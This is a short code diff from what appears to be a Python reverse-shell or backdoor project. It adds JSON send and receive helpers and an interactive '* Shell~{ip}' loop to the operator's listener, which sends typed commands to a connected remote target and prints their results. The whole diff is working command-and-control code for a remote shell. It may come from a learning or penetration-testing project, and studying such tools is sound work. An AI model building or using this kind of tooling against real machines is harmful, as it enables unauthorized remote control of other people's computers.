@@ -1,10 +1,30 @@
 import socket
 from termcolor import colored
 import pyfiglet
+import json
+
+def recv_data():
+	data = ''
+	while True:
+		try:
+			data = data + target.recv(1024).decode().rstrip()
+			return json.loads(data)
+		except ValueError:
+			continue
+
+def send_data(data):
+	jsondata = json.dumps(data) # serializing the data so as to send reliably.
+	target.send(jsondata.encode()) # encoding the serialized data & sending it to the target.
 
 def target_communication():
-	message = target.recv(1024)
-	print(message.decode())
+	while True:
+		command = input(f"* Shell~{ip}: ")
+		send_data(command)
+		if command == "quit":
+			break
+
+		result = recv_data()
+		print(f"\n {result}")
 
 
 if __name__ == "__main__":
